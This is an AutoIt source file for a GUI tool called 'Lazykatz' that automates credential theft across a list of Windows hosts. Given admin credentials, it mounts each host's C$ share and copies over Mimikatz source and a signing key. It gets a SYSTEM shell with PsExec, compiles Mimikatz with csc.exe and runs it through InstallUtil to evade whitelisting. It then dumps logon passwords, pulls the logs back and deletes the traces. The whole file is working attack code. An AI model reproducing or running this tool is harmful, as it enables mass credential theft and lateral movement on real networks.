#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Res_Fileversion=1.0.0.1
#AutoIt3Wrapper_Res_Fileversion_AutoIncrement=y
#AutoIt3Wrapper_Res_requestedExecutionLevel=requireAdministrator
#AutoIt3Wrapper_Run_Au3Stripper=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Change2CUI=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include "Cmd.au3"
#include <File.au3>
#include <GUIConstants.au3>

Global $dir = @WorkingDir
FileDelete(@TempDir & "\psexec.exe")
FileInstall("PsExec.exe", @TempDir & "\psexec.exe")
FileInstall("katz.cs", @TempDir & "\katz.cs")
FileInstall("key.snk", @TempDir & "\key.snk")

$Form1 = GUICreate("Lazykatz", 622, 448, 192, 125)
GUICtrlCreateLabel("Username", 80, 40, 90, 25)
GUICtrlCreateLabel("Password", 80, 100, 90, 25)
GUICtrlCreateLabel("Choose IP list", 80, 155, 90, 25)
Global $USER1 = GUICtrlCreateInput("", 180, 40, 90, 25)
Global $PASS1 = GUICtrlCreateInput("", 180, 100, 90, 25,0x0020)
$Button1 = GUICtrlCreateButton("Browse", 180, 150, 81, 25)
$run = GUICtrlCreateButton("Start",80, 250, 120, 25)

GUISetState(@SW_SHOW)
While 1
    $msg = GuiGetMsg()
    Select
    Case $msg = $GUI_EVENT_CLOSE
        ExitLoop
    Case $msg = $Button1
		Global $list = FileOpenDialog("Select the IP list", @WorkingDir, "text (*.txt)", 1 + 4 )
		GUICtrlCreateLabel($list, 300, 155, 1000, 25)
        ;MsgBox(4096,"","You chose " & $list)
		Case $msg = $run
		Global $user = GUICtrlRead($USER1)
		Global $pass = GUICtrlRead($PASS1)
		attack()
    Case Else
    ;;;;;;;
    EndSelect
WEnd

Func attack()
FileChangeDir(@TempDir)

MsgBox("","","IMPORTANT: Sit back and relax, don't touch the computer until I stuck ;)")


FileOpen($list, 0)
FileDelete("output.txt")

For $j = 1 to _FileCountLines($list)
    $ip = FileReadLine($list, $j)
	GUICtrlCreateLabel("", 80, 200, 200, 25)
	Sleep(1000)
	GUICtrlCreateLabel("Targetting - "&$ip, 80, 200, 200, 25)

global $status = 1

RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\c$ /u:"&$user&" "&$pass&" > output.txt 2>&1","",@SW_HIDE,0x10000)

local $file = "output.txt"
FileOpen($file, 0)

For $i = 1 to _FileCountLines($file)
    $line = FileReadLine($file, $i)
	if StringInStr($line, "error") Then
		;MsgBox("","",$line)
		Sleep(1000)
		GUICtrlCreateLabel("Error connecting - "&$ip, 80, 200, 200, 25)
	global $status = 0
	EndIf
	Next
FileClose($file)

if not $status = 0 Then

RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\katz.cs","",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\key.snk","",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "copy /Y katz.cs \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "copy /Y key.snk \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)

RunWait(@ComSpec & " /C " & "psexec.exe /accepteula \\"&$ip&" -u "&$user&" -p "&$pass&' -s -h systeminfo | find /I "System Type:" > os.txt',"",@SW_HIDE,0x10000)

local $osfile = "os.txt"
FileOpen($osfile, 0)

For $i = 1 to _FileCountLines($osfile)
    $line = FileReadLine($osfile, $i)
	if StringInStr($line, "86") Then
	;MsgBox("","","x86")
	global $os = ""
	Else
	global $os = "64"
	EndIf
	Next
FileClose($osfile)

RunWait(@ComSpec & " /C " & "dir /L /A /B /S \\"&$ip&'\c$\windows\Microsoft.NET\Framework'&$os&'\ | find /I "installutil.exe" | find /I /V "installutil.exe.conf" | find /I /V "v1.1." > framework.txt',"",@SW_HIDE,0x10000)

local $fwfile = "framework.txt"
FileOpen($fwfile, 0)

For $i = 1 to _FileCountLines($fwfile)
    $line = FileReadLine($fwfile, $i)
	global $fw = StringSplit($line, '\', $STR_ENTIRESPLIT)[8]
	;MsgBox("","",$fw)
	ExitLoop
	Next
FileClose($fwfile)

if $fw Then

$pCmd = Run( "cmd.exe" )
Sleep(1000)
$hCmd = _CmdGetWindow( $pCmd )
SendKeepActive( $hCmd )

If _CmdWaitFor( $hCmd, "Microsoft Corp", Default, Default ) Then

	Send( "echo :cmd123:&&psexec.exe /accepteula \\"&$ip&" -u "&$user&" -p "&$pass&" -s -h cmd.exe" & @CRLF )
	Sleep(1000)

	If _CmdWaitFor( $hCmd, "\WINDOWS\system32", Default, Default, ":cmd123:") Then
		Send( "cd c:\windows\temp\" & @CRLF )
		sleep(1000)
		Send( "echo :test123:&&\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&"\csc.exe /r:System.EnterpriseServices.dll /out:mimi.exe /keyfile:key.snk /unsafe katz.cs" & @CRLF )

		If _CmdWaitFor( $hCmd, "All rights reserved", Default, Default, ":test123:") Then
			sleep(100)
			Send( "echo :bkp123:&&\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&"\InstallUtil.exe /U mimi.exe" & @CRLF )
		If _CmdWaitFor( $hCmd, "mimikatz #", Default, Default, ":bkp123:" ) Then
			Send( "log" & @CRLF )
			If _CmdWaitFor( $hCmd, "logfile : OK", Default, Default ) Then
				Send( "privilege::debug" &@CRLF )
				If _CmdWaitFor( $hCmd, "Privilege '20' OK", Default, Default ) Then
					Send( "sekurlsa::logonPasswords full" &@CRLF )
					sleep(1000)
					If _CmdWaitFor( $hCmd, "mimikatz #", Default, Default, "logonPasswords" ) Then
						Send( "exit" &@CRLF )
						Sleep(1000)
						RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\mimikatz.log "&$dir&"\mimikatz_"&$ip&".log" ,"",@SW_HIDE,0x10000)
						RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\katz.cs","",@SW_HIDE,0x10000)
						RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\key.snk","",@SW_HIDE,0x10000)
						RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimikatz.log","",@SW_HIDE,0x10000)
						RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimi.exe","",@SW_HIDE,0x10000)
						Send( "exit" &@CRLF )
						Sleep(1000)
						Send( "exit" &@CRLF )
					EndIf
				EndIf

			EndIf

		EndIf

    EndIf
	EndIf
EndIf
EndIf
EndIf
Next
FileClose($list)
MsgBox("","","Attack finished.")
Exit
EndFunc